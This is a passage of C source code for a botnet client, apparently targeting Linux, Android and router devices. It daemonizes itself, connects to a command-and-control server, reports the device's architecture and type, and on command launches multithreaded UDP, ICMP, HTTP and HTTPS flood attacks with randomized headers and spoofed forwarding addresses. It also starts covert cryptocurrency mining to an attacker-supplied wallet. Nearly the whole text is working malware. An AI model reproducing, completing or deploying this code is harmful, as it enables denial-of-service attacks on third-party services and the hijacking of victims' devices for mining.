                    char *fetch_mode = fetch_modes[rand() % fetch_mode_count];
                    char *fetch_site = fetch_sites[rand() % fetch_site_count];
                    char *fetch_dest = fetch_dests[rand() % fetch_dest_count];
                    char *sysos = sys_os[rand() % sys_os_count];
                    char *winarch = win_arch[rand() % win_arch_count];
                    char *winch = win_ch[rand() % win_ch_count];
                    
                    char query_param[64];
                    char random_str[32];
                    for (int j = 0; j < 10; j++) {
                        random_str[j] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[rand() % 62];
                    }
                    random_str[10] = '\0';
                    snprintf(query_param, sizeof(query_param), "?%s=%s", "id", random_str);
                    
                    char http_request[4096];
                    snprintf(http_request, sizeof(http_request),
                            "GET %s%s HTTP/1.1\r\n"
                            "Host: %s\r\n"
                            "User-Agent: Mozilla/5.0 (%s; %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.864.59 Safari/537.36\r\n"
                            "Accept: %s\r\n"
                            "Accept-Language: %s\r\n"
                            "Accept-Encoding: %s\r\n"
                            "Cache-Control: %s\r\n"
                            "Connection: keep-alive\r\n"
                            "Upgrade-Insecure-Requests: 1\r\n"
                            "Sec-Fetch-Dest: %s\r\n"
                            "Sec-Fetch-Mode: %s\r\n"
                            "Sec-Fetch-Site: %s\r\n"
                            "Pragma: no-cache\r\n"
                            "DNT: 1\r\n"
                            "X-Forwarded-For: %d.%d.%d.%d\r\n"
                            "\r\n",
                            path, query_param, args->target, 
                            sysos, winch, winarch,
                            accept_header, language_header, encoding_header, cache_header,
                            fetch_dest, fetch_mode, fetch_site,
                            rand() % 256, rand() % 256, rand() % 256, rand() % 256);
                    
                    send(sock, http_request, strlen(http_request), MSG_DONTWAIT);
                }
            }
        }
        
        close(sock);
    }
    
    return NULL;
}

void *https_flood(void *arg) {
    FloodArgs *args = (FloodArgs *)arg;
    
    pthread_t thread[HTTPS_THREADS];
    for (int i = 0; i < HTTPS_THREADS; i++) {
        pthread_create(&thread[i], NULL, https_attack, args);
    }

    for (int i = 0; i < HTTPS_THREADS; i++) {
        pthread_join(thread[i], NULL);
    }

    return NULL;
}
char* detect_platform() {
    FILE *fp = fopen("/system/build.prop", "r");
    if (fp != NULL) {
        fclose(fp);
        return "android";
    }
    
    fp = fopen("/etc/os-release", "r");
    if (fp != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "ANDROID") != NULL) {
                fclose(fp);
                return "android";
            }
        }
        fclose(fp);
    }
    
    struct utsname buf;
    if (uname(&buf) == 0) {
        if (strstr(buf.sysname, "Linux") != NULL) return "linux";
        if (strstr(buf.sysname, "Android") != NULL) return "android";
    }
    
    return "linux";
}

char* detect_device_type() {
    FILE *fp;
    char line[256];
    
    fp = fopen("/proc/cpuinfo", "r");
    if (fp != NULL) {
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "CPU part") != NULL) {
                if (strstr(line, "0xc07") != NULL || strstr(line, "0xd03") != NULL) {
                    fclose(fp);
                    return "realtek";
                }
            }
            if (strstr(line, "MIPS") != NULL) {
                fclose(fp);
                return "mips";
            }
            if (strstr(line, "ARM") != NULL) {
                fclose(fp);
                if (system("cat /proc/version 2>/dev/null | grep -i tplink > /dev/null") == 0) return "tplink";
                if (system("cat /proc/version 2>/dev/null | grep -i zhone > /dev/null") == 0) return "zhone";
                if (system("cat /proc/version 2>/dev/null | grep -i fiber > /dev/null") == 0) return "fiber";
                return "arm";
            }
        }
        fclose(fp);
    }
    
    if (fopen("/system/build.prop", "r") != NULL) {
        return "android";
    }
    
    return "unknown";
}

void send_system_info(int sock) {
    char arch[32], platform[32], device[32];
    
    strcpy(arch, detect_architecture());
    strcpy(platform, detect_platform());
    strcpy(device, detect_device_type());
    
    char info_buffer[256];
    snprintf(info_buffer, sizeof(info_buffer), "SYSINFO arch=%s platform=%s device=%s\r\n", arch, platform, device);
    send(sock, info_buffer, strlen(info_buffer), 0);
}

void execute_attack(FloodArgs *args) {
    attack_running = 1;
    void* (*attack_func)(void*) = NULL;
    if (strcmp(args->method, "udp") == 0) attack_func = udp_flood;
    else if (strcmp(args->method, "udp-hex") == 0) attack_func = vega_hex_flood;
    else if (strcmp(args->method, "udp-bypass") == 0) attack_func = udp_bypass;
    else if (strcmp(args->method, "icmp-hex") == 0) attack_func = icmp_hex_flood;
    else if (strcmp(args->method, "std") == 0) attack_func = std_attack;
    else if (strcmp(args->method, "http") == 0) attack_func = http_flood;
    else if (strcmp(args->method, "home") == 0) attack_func = home_flood;
    else if (strcmp(args->method, "https") == 0) attack_func = https_flood;
    else if (strcmp(args->method, "pps") == 0) attack_func = pps_flood_attack;
    else if (strcmp(args->method, "fortnite") == 0) attack_func = fortnite_flood;
    else return;
    thread_count = THREADS;
    for (int i = 0; i < THREADS; i++) pthread_create(&attack_threads[i], NULL, attack_func, args);
    for (int i = 0; i < THREADS; i++) pthread_join(attack_threads[i], NULL);
    attack_running = 0;
    thread_count = 0;
}

void handle_signal(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        stop_mining();
        running = 0;
        exit(0);
    }
}

void parse_command(char* command, char* method, char* ip, int* duration, int* port, int* packet_size, int* pps_rate, int* connections) {
    char command_copy[BUFFER_SIZE];
    strcpy(command_copy, command);
    char* token = strtok(command_copy, " ");
    if (token) strcpy(method, token);
    token = strtok(NULL, " ");
    if (token) {
        if (strstr(token, "http://") == token) {
            strcpy(ip, token + 7);
        } else if (strstr(token, "https://") == token) {
            strcpy(ip, token + 8);
        } else {
            strcpy(ip, token);
        }
        
        char *slash = strchr(ip, '/');
        if (slash) *slash = '\0';
    }
    token = strtok(NULL, " ");
    if (token) *duration = atoi(token);
    *port = 0;
    *packet_size = DEFAULT_PACKET_SIZE;
    *pps_rate = 10000;
    *connections = DEFAULT_CONNECTIONS;
    token = strtok(NULL, " ");
    while (token != NULL) {
        if (strstr(token, "dport=") == token) *port = atoi(token + 6);
        else if (strstr(token, "len=") == token) *packet_size = atoi(token + 4);
        else if (strstr(token, "pps=") == token) *pps_rate = atoi(token + 4);
        else if (strstr(token, "connections=") == token) *connections = atoi(token + 12);
        token = strtok(NULL, " ");
    }
    
    if (strcmp(method, "http") == 0 && *port == 0) {
        *port = 80;
    }
    if (strcmp(method, "https") == 0 && *port == 0) {
        *port = 443;
    }
}
void* attack_handler(void* arg) {
    char* command = (char*)arg;
    char method[32], ip[64];
    int duration, port, packet_size, pps_rate, connections;
    parse_command(command, method, ip, &duration, &port, &packet_size, &pps_rate, &connections);
    if ((strcmp(method, "udp") == 0 || strcmp(method, "udp-hex") == 0 || 
         strcmp(method, "udp-bypass") == 0 || strcmp(method, "icmp-hex") == 0 ||
         strcmp(method, "std") == 0 || strcmp(method, "fortnite") == 0 || 
         strcmp(method, "home") == 0 || strcmp(method, "pps") == 0 ||
         strcmp(method, "http") == 0 || strcmp(method, "https") == 0) && 
        port > 0 && duration > 0) {
        FloodArgs args;
        strncpy(args.target, ip, sizeof(args.target) - 1);
        strncpy(args.method, method, sizeof(args.method) - 1);
        args.target[sizeof(args.target) - 1] = '\0';
        args.method[sizeof(args.method) - 1] = '\0';
        args.port = port;
        args.duration = duration;
        args.packet_size = packet_size;
        args.pps_rate = pps_rate;
        args.connections = connections;
        execute_attack(&args);
    }
    free(command);
    return NULL;
}

void *http_attack(void *arg) {
    FloodArgs *args = (FloodArgs *)arg;
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;
    
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target.sin_addr);
    
    char *user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
    };
    int user_agent_count = 4;
    
    char *paths[] = {
        "/", "/index.html", "/home", "/api", "/test", "/admin",
        "/login", "/wp-admin", "/images/logo.png", "/css/style.css"
    };
    int path_count = 10;

    char http_request[HTTP_BUFFER_SIZE];
    time_t end_time = time(NULL) + args->duration;
    
    connect(sock, (struct sockaddr *)&target, sizeof(target));
    
    while (time(NULL) < end_time && attack_running) {
        if (rand() % 5 == 0) {
            close(sock);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            fcntl(sock, F_GETFL, 0);
            fcntl(sock, F_SETFL, flags | O_NONBLOCK);
            connect(sock, (struct sockaddr *)&target, sizeof(target));
        }
        
        char *user_agent = user_agents[rand() % user_agent_count];
        char *path = paths[rand() % path_count];
        
        snprintf(http_request, sizeof(http_request),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "Connection: keep-alive\r\n"
                "Cache-Control: no-cache\r\n"
                "\r\n",
                path, args->target, user_agent);
        
        send(sock, http_request, strlen(http_request), MSG_DONTWAIT);
        
        usleep(1000);
    }
    
    close(sock);
    return NULL;
}

void *http_flood(void *arg) {
    FloodArgs *args = (FloodArgs *)arg;
    
    pthread_t thread[HTTP_THREADS];
    for (int i = 0; i < HTTP_THREADS; i++) {
        pthread_create(&thread[i], NULL, http_attack, args);
    }

    for (int i = 0; i < HTTP_THREADS; i++) {
        pthread_join(thread[i], NULL);
    }

    return NULL;
}

int handle_server_commands(int sock) {
    char buffer[BUFFER_SIZE];
    
    while (running) {
        int bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received <= 0) break;
        
        buffer[bytes_received] = '\0';
        
        if (strstr(buffer, "stop") != NULL) {
            stop_attack();
            send(sock, "[Bot] Attack stopped\r\n", 22, 0);
        }
        else if (strstr(buffer, "mine start") == buffer) {
            char* token = strtok(buffer, " ");
            token = strtok(NULL, " ");
            char* wallet = strtok(NULL, " ");
            char* threads_str = strtok(NULL, " ");
            char* suffix = strtok(NULL, " ");

            int threads = 1;
            if (threads_str) {
                threads = atoi(threads_str);
            }

            if (wallet && strlen(wallet) > 0) {
                if (suffix && strlen(suffix) > 0) {
                    char wallet_with_suffix[256];
                    snprintf(wallet_with_suffix, sizeof(wallet_with_suffix), "%s.%s", wallet, suffix);
                    start_mining(wallet_with_suffix, threads);
                } else {
                    start_mining(wallet, threads);
                }
                char response[256];
                snprintf(response, sizeof(response), "[Bot] Mining started: %s (threads: %d)\r\n", wallet, threads);
                send(sock, response, strlen(response), 0);
            }
        }
        else if (strstr(buffer, "mine stop") != NULL) {
            stop_mining();
            send(sock, "[Bot] Mining stopped\r\n", 22, 0);
        }
        else if (strstr(buffer, "mine status") != NULL) {
            update_mining_status(sock);
        }
        else if (strstr(buffer, "ping") != NULL) {
            send(sock, "pong\r\n", 6, 0);
        }
        
        else if (strstr(buffer, "udp") == buffer || 
                 strstr(buffer, "icmp-hex") == buffer || 
                 strstr(buffer, "std") == buffer || 
                 strstr(buffer, "home") == buffer || 
                 strstr(buffer, "pps") == buffer || 
                 strstr(buffer, "fortnite") == buffer ||
                 strstr(buffer, "http") == buffer ||
                 strstr(buffer, "https") == buffer) {
            
            char* command_copy = strdup(buffer);
            char* newline = strchr(command_copy, '\r');
            if (newline) *newline = '\0';
            newline = strchr(command_copy, '\n');
            if (newline) *newline = '\0';
            
            pthread_t attack_thread;
            pthread_create(&attack_thread, NULL, attack_handler, command_copy);
            pthread_detach(attack_thread);
            
            char response[BUFFER_SIZE];
            sprintf(response, "[Bot] Attack started: %s\r\n", command_copy);
            send(sock, response, strlen(response), 0);
        }
    }
    return 0;
}

int connect_to_cnc() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(CNC_PORT);
    inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return -1;
    }
    
    send_system_info(sock);
    
    char welcome[BUFFER_SIZE];
    int bytes_received = recv(sock, welcome, BUFFER_SIZE - 1, 0);
    if (bytes_received > 0) {
        welcome[bytes_received] = '\0';
    }
    
    return sock;
}

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    if (setsid() < 0) exit(1);
    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    umask(0);
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_RDWR);
    open("/dev/null", O_WRONLY);
}

int main() {
    daemonize();
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    signal(SIGPIPE, SIG_IGN);
    init_hex_strings();
    srand(time(NULL));
    
    while (running) {
        int sock = connect_to_cnc();
        if (sock >= 0) {
            handle_server_commands(sock);
            close(sock);
        } else {
            sleep(10);
        }
    }
    return 0;
}